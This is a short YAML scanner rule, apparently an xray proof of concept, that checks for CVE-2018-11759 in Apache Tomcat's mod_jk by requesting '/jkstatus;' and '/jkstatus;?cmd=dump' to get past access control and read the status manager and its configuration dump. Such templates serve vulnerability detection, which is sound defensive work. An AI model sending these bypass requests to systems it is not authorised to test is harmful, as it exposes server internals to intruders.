detail:
  author: loneyer
  links:
  - https://github.com/immunIT/CVE-2018-11759
expression: r0() && r1()
manual: true
name: poc-yaml-tomcat-cve-2018-11759
rules:
  r0:
    expression: response.status == 200 && "JK Status Manager".bmatches(response.body)
      && "Listing Load Balancing Worker".bmatches(response.body)
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /jkstatus;
  r1:
    expression: response.status == 200 && "ServerRoot=*".bmatches(response.body)
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /jkstatus;?cmd=dump
transport: http
